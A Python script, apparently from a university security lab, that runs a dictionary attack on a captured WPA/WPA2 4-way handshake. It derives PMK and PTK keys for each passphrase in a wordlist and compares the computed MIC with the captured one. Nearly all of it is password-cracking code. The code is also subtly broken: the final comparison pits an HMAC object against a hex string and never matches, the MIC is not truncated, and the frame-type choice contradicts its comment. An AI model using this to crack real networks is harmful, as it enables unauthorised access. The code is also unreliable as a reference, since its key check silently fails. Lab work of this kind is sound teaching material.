#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Authors: Thomann Yanick, Galley David, Gachet Jean
Date: 27/04/2023

Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

import hashlib
import hmac
from binascii import a2b_hex, b2a_hex
from scapy.all import *
from pbkdf2 import *


# Custom class to store the SSID and MAC address of an AP
class SSIDInfo(NamedTuple):
    ssid: str
    mac_address: str


# Function used to get APs from a pcap capture
def find_ssid(pcap_file):
    # Initialize and empty dictionary to contain APs
    ssids = {}
    # Read all packets in capture
    packets = rdpcap(pcap_file)
    # Iterate over all packets in capture
    for packet in packets:
        # If the packet is a 802.11 beacon
        if packet.haslayer(Dot11AssoReq):  # TODO AssoReq better than Beacon ?
            # Retrieve the SSID
            ssid = packet[Dot11Elt].info.decode()
            # Add AP to dict if not seen before
            if ssid not in ssids:
                ssids[ssid] = packet.addr3  # TODO addr3 better than addr2 for Beacon (since it's a management frame) ?
    # If there is only one AP found, return its SSID and MAC in an SSIDInfo object
    if len(ssids) == 1:
        ssid, mac = next(iter(ssids.items()))
        return SSIDInfo(ssid=ssid, mac_address=mac)
    # If there are multiple, ask user to choose and return the chosen one
    elif len(ssids) > 1:
        ssid_infos = []
        for ssid, mac in ssids.items():
            ssid_infos.append(SSIDInfo(ssid=ssid, mac_address=mac))
        print("Multiple SSIDs found:")
        for ssid_info in ssid_infos:
            print(f"SSID: {ssid_info.ssid} | MAC Address: {ssid_info.mac_address}")
        chosen_ssid = input("Please choose an SSID by typing its name: ")
        while chosen_ssid not in ssids:
            chosen_ssid = input("Invalid choice. Please choose an SSID by typing its name: ")
        mac = ssids[chosen_ssid]
        return SSIDInfo(ssid=chosen_ssid, mac_address=mac)
    else:
        print("No AP found in capture, exiting...")
        exit()


def get_next_line_from_file(filename):
    """
    This function yields one line at a time from the given file.
    """
    with open(filename, 'r') as file:
        for line in file:
            yield line.strip()


def custom_prf512(key, A, B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i = 0
    R = b''
    while i <= ((blen * 8 + 159) / 160):
        hmacsha1 = hmac.new(key, A + str.encode(chr(0x00)) + B + str.encode(chr(i)), hashlib.sha1)
        i += 1
        R = R + hmacsha1.digest()
    return R[:blen]


if __name__ == '__main__':

    hmac.HMAC

    ssid_info = find_ssid("wpa_handshake.cap")
    print(ssid_info)

    # Read capture file -- it contains beacon, authentication, association, handshake and data
    wpa = rdpcap("wpa_handshake.cap")

    # Important parameters for key derivation - most of them can be obtained from the pcap file
    valid_passphrase = b"actuelle"
    ssid = b"SWI"  # TODO get from cap

    ap_mac = a2b_hex("cebcc8fdcab7")  # TODO get from cap
    client_mac = a2b_hex("0013efd015bd")  # TODO get from cap

    # Authenticator and Supplicant Nonces
    ap_nonce = a2b_hex("90773b9a9661fee1f406e8989c912b45b029c652224e8b561417672ca7e0fd91")  # TODO get from cap
    client_nonce = a2b_hex("7b3826876d14ff301aee7c1072b5e9091e21169841bce9ae8a3f24628f264577")  # TODO get from cap

    # This is the MIC contained in the 4th frame of the 4-way handshake
    mic_to_test = "36eef66540fa801ceee2fea9b7929b40"  # TODO get from cap

    a = b"Pairwise key expansion"  # this string is used in the pseudo-random function
    b = min(ap_mac, client_mac) + max(ap_mac, client_mac) + min(ap_nonce, client_nonce) + max(ap_nonce, client_nonce)

    # TODO get from cap ?
    data = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")  # cf "Quelques détails importants" dans la donnée

    for passphrase in get_next_line_from_file("passphrases.txt"):
        # derives the PMK and then the PTK
        pmk = pbkdf2(hashlib.sha1, str.encode(passphrase), ssid, 4096, 32)
        ptk = custom_prf512(pmk, a, b)

        # PTK = KCK|KEK|TK|MICK
        kck = ptk[0:16]

        # calculate MIC over EAPOL payload (Michael)
        mic = hmac.new(kck, data, hashlib.sha1)
        if mic == mic_to_test:
            print(passphrase)
            break
